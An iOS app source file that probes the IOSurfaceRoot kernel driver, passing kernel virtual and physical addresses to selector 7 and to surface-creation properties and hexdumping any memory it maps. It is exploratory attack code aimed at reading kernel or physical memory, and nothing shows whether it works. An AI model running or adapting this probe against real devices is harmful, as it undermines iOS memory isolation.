#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <string.h>
#import <stdlib.h>
#import <mach/mach.h>
static NSMutableString *gLog; static NSString *gPath;
static void L(NSString *fmt,...){va_list ap;va_start(ap,fmt);NSString*s=[[NSString alloc]initWithFormat:fmt arguments:ap];va_end(ap);[gLog appendString:s];[gLog appendString:@"\n"];[gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];NSLog(@"[st] %@",s);}
static uint64_t rd64(const void*p){uint64_t v;memcpy(&v,p,8);return v;}
static void hexdump(const char*tag,const uint8_t*b,int n){for(int i=0;i<n;i+=16){NSMutableString*m=[NSMutableString string];for(int j=0;j<16&&i+j<n;j++)[m appendFormat:@"%02x ",b[i+j]];L(@"[%s] %04x: %@",tag,i,m);}}
static void try_sel7(io_connect_t c,int type,const char*tag,uint64_t addr,uint64_t len){
 uint64_t sc[2]={addr,len}; uint8_t out[0xc68]; memset(out,0xAA,sizeof(out)); size_t os=sizeof(out); uint64_t so[4]={0}; uint32_t soc=0;
 kern_return_t kr=IOConnectCallMethod(c,7,sc,2,NULL,0,NULL,NULL,out,&os);
 L(@"[t%d sel7 %s] addr=0x%llx -> 0x%x osz=0x%zx q0=0x%llx q1=0x%llx q2=0x%llx q3=0x%llx",type,tag,(unsigned long long)addr,kr,os,
   (unsigned long long)rd64(out),(unsigned long long)rd64(out+8),(unsigned long long)rd64(out+0x10),(unsigned long long)rd64(out+0x18));
 if(kr) return;
 uint32_t sid=*(uint32_t*)(out+0x18);
 IOSurfaceRef sf=IOSurfaceLookup(sid);
 L(@"[t%d sel7 %s] id=%u lookup=%p",type,tag,sid,sf);
 if(sf){ void*base=IOSurfaceGetBaseAddress(sf); size_t al=IOSurfaceGetAllocSize(sf);
   L(@"[t%d sel7 %s] base=%p alloc=0x%zx",type,tag,base,al);
   if(base && (uintptr_t)base>0x100000000ULL && (uintptr_t)base<0x800000000000ULL){ uint8_t*p=(uint8_t*)base; hexdump(tag,p,0x40); }
   CFRelease(sf);
 }
}
static IOSurfaceRef make_surf(NSString*region,uint64_t addr,uint64_t alloc,uint64_t w,uint64_t h){
 NSMutableDictionary*d=[NSMutableDictionary dictionary];
 d[(id)kIOSurfaceWidth]=@(w); d[(id)kIOSurfaceHeight]=@(h); d[(id)kIOSurfaceBytesPerElement]=@4; d[(id)kIOSurfacePixelFormat]=@0x42475241;
 if(alloc) d[@"IOSurfaceAllocSize"]=@(alloc);
 if(addr) d[@"IOSurfaceAddress"]=@(addr);
 if(region) d[@"IOSurfaceMemoryRegion"]=region;
 return IOSurfaceCreate((__bridge CFDictionaryRef)d);
}
static void run(void){
 io_service_t svc=IOServiceGetMatchingService(kIOMasterPortDefault,IOServiceMatching("IOSurfaceRoot"));
 L(@"[svc] 0x%x",svc); if(!svc)return;
 vm_address_t ub=0; vm_allocate(mach_task_self(),&ub,0x4000,VM_FLAGS_ANYWHERE); memset((void*)ub,0x5A,0x4000);
 uint64_t addrs[]={ub,0x04D00000ULL,0x04D04000ULL,0x04D08000ULL,0x800000000ULL,0xfffffff007004000ULL,0x100000000ULL,0x1000ULL};
 const char*names[]={"ownva","ttbat0","ttbat4","ttbat8","paddr32g","kva","va4g","p1k"};
 for(uint32_t t=0;t<6;t++){
  io_connect_t c=0; kern_return_t kr=IOServiceOpen(svc,mach_task_self(),t,&c);
  L(@"[open t%u] 0x%x conn=0x%x",t,kr,c); if(kr) continue;
  for(int i=0;i<8;i++) try_sel7(c,t,names[i],addrs[i],0x4000);
  IOServiceClose(c);
 }
 /* property-based creation, all types */
 for(uint32_t t=0;t<2;t++){
  io_connect_t c=0; kern_return_t kr=IOServiceOpen(svc,mach_task_self(),t,&c); if(kr) continue;
  for(int i=1;i<4;i++){
   IOSurfaceRef s=make_surf(nil,addrs[i],0x4000,64,64);
   L(@"[prop t%u %s addr] surf=%p",t,names[i],s);
   if(s){void*b=IOSurfaceGetBaseAddress(s);L(@"[prop t%u %s] base=%p alloc=0x%zx",t,names[i],b,IOSurfaceGetAllocSize(s)); if(b&&(uintptr_t)b<0x800000000000ULL)hexdump("prop",b,0x20);CFRelease(s);}
  }
  IOSurfaceRef s=make_surf(@"PurpleGfxMem",0x04D00000,0x4000,64,64);
  L(@"[purple t%u] surf=%p",t,s);
  if(s){void*b=IOSurfaceGetBaseAddress(s);L(@"[purple t%u] base=%p alloc=0x%zx",t,b,IOSurfaceGetAllocSize(s)); if(b&&(uintptr_t)b<0x800000000000ULL)hexdump("purple",b,0x20);CFRelease(s);}
  IOServiceClose(c);
 }
 IOObjectRelease(svc); L(@"=== done ===");
}
@interface AppDelegate:UIResponder<UIApplicationDelegate>@property(strong,nonatomic)UIWindow*window;@end
@implementation AppDelegate
- (BOOL)application:(UIApplication*)app didFinishLaunchingWithOptions:(NSDictionary*)opts{
 self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];UIViewController*vc=[UIViewController new];vc.view.backgroundColor=UIColor.blackColor;
 UITextView*tv=[[UITextView alloc]initWithFrame:vc.view.bounds];tv.backgroundColor=UIColor.blackColor;tv.textColor=UIColor.greenColor;tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular];tv.editable=NO;tv.text=@"SurfTypes\n";
 [vc.view addSubview:tv];self.window.rootViewController=vc;[self.window makeKeyAndVisible];[UIApplication sharedApplication].idleTimerDisabled=YES;
 dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH,0),^{NSString*docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES) firstObject];gPath=[docs stringByAppendingPathComponent:@"st.log"];gLog=[NSMutableString new];run();dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;});});
 return YES;}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
